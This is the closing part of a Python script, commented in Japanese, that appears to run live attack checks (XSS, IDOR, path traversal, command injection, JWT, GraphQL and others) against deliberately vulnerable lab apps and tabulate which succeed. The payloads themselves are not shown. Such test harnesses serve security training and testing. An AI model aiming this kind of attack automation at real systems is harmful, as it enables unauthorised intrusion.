    ("XSS-R", _c_xss_r), ("XSS-S", _c_xss_s), ("XSS-S2", _c_xss_s2), ("XSS-S3", _c_xss_s3),
    ("IDOR-1", _c_idor1), ("IDOR-2", _c_idor2),
    ("PATH-1", _c_path1), ("CMD-1", _c_cmd1), ("AUTHZ-1", _c_authz1),
    # AUTHZ-2/4 は testuser がまだ利用者のうちに実行し、最後に AUTHZ-3 で昇格させる。
    ("AUTHZ-2", _c_authz2), ("AUTHZ-4", _c_authz4), ("AUTHZ-3", _c_authz3),
    ("BIZ-1", _c_biz1), ("BIZ-2", _c_biz2),
    ("COOKIE-1", _c_cookie_httponly), ("COOKIE-2", _c_cookie_secure),
    ("WS-1", _c_ws1), ("WS-2", _c_ws2), ("WS-3", _c_ws3), ("WS-4", _c_ws4),
    ("JWT-1", _c_jwt1), ("JWT-2", _c_jwt2), ("JWT-3", _c_jwt3),
    ("JWT-4", _c_jwt4), ("JWT-5", _c_jwt5), ("JWT-6", _c_jwt6), ("JWT-7", _c_jwt7),
    ("MASS-1", _c_mass1), ("ENUM-1", _c_enum1), ("ENUM-2", _c_enum2), ("PWPOLICY-1", _c_pwpolicy1),
    ("GQL-1", _c_gql1), ("GQL-2", _c_gql2), ("GQL-3", _c_gql3), ("GQL-4", _c_gql4),
    ("GQL-5", _c_gql5), ("GQL-6", _c_gql6), ("GQL-7", _c_gql7),
]


def run_smoke(base_url, site="all", features=None, delivery_mode="dev_inbox"):
    """
    稼働中ターゲット(base_url)に HTTP で攻撃を当て、結果を返す。
    site: all/bank/ec（そのサイトの観測可能脆弱性だけを対象にする）。
    features: 有効なバリア集合（ペイロード/フローの適応に使う）。
    """
    features = set(features or [])

    def make():
        return Session(base_url)

    # 疎通確認
    up_status, _ = make().get("/")
    results = []
    for vid, fn in CHECKS:
        # smoke は実際に攻撃を当てるため、ログ観測可否(_OBSERVABLE)に縛られない
        # （JWT のようにヘッダ起因で「ログ非観測」でも、ライブでは成立を確認できる）。
        if site != "all" and site not in _SITE.get(vid, set()):
            continue
        if up_status == 0:
            results.append({"id": vid, "type": _TYPE.get(vid, "?"), "status": SKIPPED,
                            "detail": "ターゲットに到達できない"})
            continue
        try:
            status, detail = fn(make, features, delivery_mode)
        except Exception as e:  # noqa: BLE001
            status, detail = FAIL, "例外: %r" % e
        results.append({"id": vid, "type": _TYPE.get(vid, "?"), "status": status, "detail": detail})

    exploited = sum(1 for r in results if r["status"] == EXPLOITED)
    applicable = len(results)
    return {
        "base_url": base_url, "site": site, "reachable": up_status != 0,
        "results": results, "exploited": exploited, "applicable": applicable,
    }


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(description="VulnBank/VulnEC ライブ・スモークテスト")
    ap.add_argument("base_url", help="例: http://127.0.0.1:8081")
    ap.add_argument("--site", default="all", choices=["all", "bank", "ec", "board", "graphql"])
    ap.add_argument("--features", default="", help="有効なバリア(カンマ区切り) 例: waf,csrf")
    ap.add_argument("--delivery", default="dev_inbox", choices=["dev_inbox", "smtp", "ses"])
    args = ap.parse_args(argv)
    feats = {f.strip() for f in args.features.split(",") if f.strip()}

    rep = run_smoke(args.base_url, site=args.site, features=feats, delivery_mode=args.delivery)
    print("ライブ・スモークテスト: %s （site=%s, features=%s, delivery=%s）\n"
          % (rep["base_url"], rep["site"], ",".join(sorted(feats)) or "なし", args.delivery))
    if not rep["reachable"]:
        print("ターゲットに到達できませんでした。")
        return 2
    print("%-8s %-22s %-10s %s" % ("ID", "種別", "結果", "詳細"))
    print("-" * 74)
    label = {EXPLOITED: "成立", BLOCKED: "阻止", SKIPPED: "スキップ", FAIL: "不発"}
    for r in rep["results"]:
        print("%-8s %-22s %-10s %s" % (r["id"], r["type"], label[r["status"]], r["detail"]))
    print("-" * 74)
    print("成立: %d / %d（対象=観測可能な脆弱性）" % (rep["exploited"], rep["applicable"]))
    # fail があれば異常終了（target が壊れている）。blocked/skipped は設定由来なので許容。
    return 1 if any(r["status"] == FAIL for r in rep["results"]) else 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
